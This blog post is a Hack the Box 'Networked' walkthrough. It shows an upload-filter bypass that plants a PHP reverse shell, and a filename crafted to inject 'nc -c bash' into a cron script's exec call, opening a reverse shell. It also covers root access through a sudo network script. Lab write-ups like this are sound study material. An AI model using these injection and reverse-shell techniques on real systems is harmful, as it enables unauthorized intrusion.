---
layout:     post
title:      Hack the Box - Networked
date:       2019-11-16 10:00:00 -0400
summary:    HTB Networked machine walkthrough. Stepping through methodology of what worked, what didn't and any interesting notes gleaned along the way.
categories: hack-the-box
thumbnail: cogs
tags:
 - htb 
 - walkthrough
 - writeup
 - cron
 - sudo
 - dirb
---

<h1>Introduction</h1>
<p align="center">
<img width="75%" height="75%" src="{{ '/assets/htb-networked/infocard.PNG' | relative_url }}">
</p>

<p>Networked was a good introduction to the world of HTB. Generally discussed as the easiest of the active boxes at time of retirement there is nothing particularly complex with getting to root. Initial foothold involved byassing upload restrictions to get a reverse shell initiated. User pivot required abusing an existing cron job running as our user guly. Finally, root required leveraging a sudo script and escaping the constraints to execute arbitrary code as root.</p>

<h1>Initial Recon</h1>

<p>Kicking it off with an NMAP scan.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-nmap.PNG' | relative_url }}">
</p>

<p>Let's pop open the browser and take a look at what we can find.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-site1.PNG' | relative_url }}">
</p>

<p>Hum, didn't see very much so let's see if directory buster can discover anything further for us.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-dirb.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-upload3.PNG' | relative_url }}">
</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-upload.PNG' | relative_url }}">
</p>

<p>Awesome, look's like we potentially have some capability to upload files. Let's try uploading a php reverse shell from pentestmonkey.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-upload2.PNG' | relative_url }}">
</p>

<p>After attempting a few different variants including tacking on <code>.jpg</code> to my <code>.php</code> it was still being blocked. Taking a step back I explored the remainder of the identified locations and backup provided an interesting item.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-backup.PNG' | relative_url }}">
</p>

<p>Well now isn't that interesting! A backup of the files being used for the site, including <code>upload.php</code>. Perfect, now we can take a look at restrictions imposed on the potential upload.</p>

{% highlight php %}
cat upload.php
<?php
require 'lib.php';

define("UPLOAD_DIR", "uploads/");

if( isset($_POST['submit']) ) {
  if (!empty($_FILES["myFile"])) {
    $myFile = $_FILES["myFile"];

    if (!(check_file_type($_FILES["myFile"]) && filesize($_FILES['myFile']['tmp_name']) < 60000)) {
      echo '<pre>Invalid image file1.</pre>';
      displayform();
    }

    if ($myFile["error"] !== UPLOAD_ERR_OK) {
        echo "<p>An error occurred.</p>";
        displayform();
        exit;
    }

    //$name = $_SERVER['REMOTE_ADDR'].'-'. $myFile["name"];
    list ($foo,$ext) = getnameUpload($myFile["name"]);
    $validext = array('.jpg', '.png', '.gif', '.jpeg');
    $valid = false;
    foreach ($validext as $vext) {
      if (substr_compare($myFile["name"], $vext, -strlen($vext)) === 0) {
        $valid = true;
      }
    }

    if (!($valid)) {
      echo "<p>Invalid image file2</p>";
      displayform();
      exit;
    }
{% endhighlight %}

{% highlight php %}
cat lib.php 
<?php
...
function file_mime_type($file) {
  $regexp = '/^([a-z\-]+\/[a-z0-9\-\.\+]+)(;\s.+)?$/';
  if (function_exists('finfo_file')) {
    $finfo = finfo_open(FILEINFO_MIME);
    if (is_resource($finfo)) // It is possible that a FALSE value is returned, if there is no magic MIME database file found on the system
    {
      $mime = @finfo_file($finfo, $file['tmp_name']);
      finfo_close($finfo);
      if (is_string($mime) && preg_match($regexp, $mime, $matches)) {
        $file_type = $matches[1];
        return $file_type;
      }
    }
  }
  if (function_exists('mime_content_type'))
  {
    $file_type = @mime_content_type($file['tmp_name']);
    if (strlen($file_type) > 0) // It's possible that mime_content_type() returns FALSE or an empty string
    {
      return $file_type;
    }
  }
  return $file['type'];
}

function check_file_type($file) {
  $mime_type = file_mime_type($file);
  if (strpos($mime_type, 'image/') === 0) {
      return true;
  } else {
      return false;
  }  
}
{% endhighlight %}

<p>Now with an understanding of what the restrictions are we are able to follow along with <a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md">this page</a> and insert a <code>GIF89a;</code> at the top of the php reverse shell. It was successful and going to the <code>photos.php</code> page with a reverse listener active we are able to get our initial foothold.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/recon-apache.PNG' | relative_url }}">
</p>

<h1>User exploitation</h1>

<p>Unfortunately this shell did not grant us access to the user flag so we need to figure out a pivot to the true user. After some initial enumeration I stumbled onto the following cronjob.</p>

{% highlight shell %}
sh-4.2$ cat cron	
cat crontab.guly 
*/3 * * * * php /home/guly/check_attack.php
{% endhighlight %}

<p>Now checking what the <code>check_attack.php</code> script actually does...</p>

{% highlight php %}
sh-4.2$ cat check	
cat check_attack.php 
<?php
require '/var/www/html/lib.php';
$path = '/var/www/html/uploads/';
$logpath = '/tmp/attack.log';
$to = 'guly';
$msg= '';
$headers = "X-Mailer: check_attack.php\r\n";

$files = array();
$files = preg_grep('/^([^.])/', scandir($path));

foreach ($files as $key => $value) {
	$msg='';
  if ($value == 'index.html') {
	continue;
  }
  #echo "-------------\n";

  #print "check: $value\n";
  list ($name,$ext) = getnameCheck($value);
  $check = check_ip($name,$value);

  if (!($check[0])) {
    echo "attack!\n";
    # todo: attach file
    file_put_contents($logpath, $msg, FILE_APPEND | LOCK_EX);

    exec("rm -f $logpath");
    exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
    echo "rm -f $path$value\n";
    mail($to, $msg, $msg, $headers, "-F$value");
  }
}

?>
{% endhighlight %}

<p>The interesting part is the <code>exec</code> line where we control the contents of <code>$value</code>. Carefully crafting a test file we should be able to arbitrarily execute code as the user <code>guly</code>. Let's give a shot.</p>

{% highlight shell %}
sh-4.2$ touch "no; nc -c bash 10.10.xx.xx 31337"
touch "no; nc -c bash 10.10.xx.xx 31337"
{% endhighlight %}

<p>Now with another nc listener setup, we wait for the cronjob to kick off.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/user.PNG' | relative_url }}">
</p>

<p>With that user is done. Unto root!</p>

<h1>Root exploitation</h1>

<p>Root was rather simple comparatively. With our <code>guly</code> shell we kick off another round of enumeration. Quickly find that there is a root sudo rule in place.</p>

{% highlight shell %}
sudo -l
Matching Defaults entries for guly on networked:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
{% endhighlight %}

<p>And taking a look at the <code>changename.sh</code> script:</p>

{% highlight shell %}
cat /usr/local/sbin/changename.sh
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
{% endhighlight %}

<p>Now giving it a test run let's see what happens.</p>

{% highlight shell %}
sudo -u root /usr/local/sbin/changename.sh
interface NAME:
test
interface PROXY_METHOD:
test
interface BROWSER_ONLY:
test
interface BOOTPROTO:
test
ERROR     : [/etc/sysconfig/network-scripts/ifup-eth] Device guly0 does not seem to be present, delaying initialization.
{% endhighlight %}

<p>Ok nothing too telling here. So let's go back to the code. Seems to be some general regex to avoid special characters that would allow encapsultation. After a few different tests I realized that <code>\</code> escaped characters were being interpreted well. So let's see if we can chain together some execution as <code>root</code> using the technique.</p>

<p align="center">
<img src="{{ '/assets/htb-networked/root.PNG' | relative_url }}">
</p>

<p>And with that Network is in the books! Thanks folks, until next time.</p>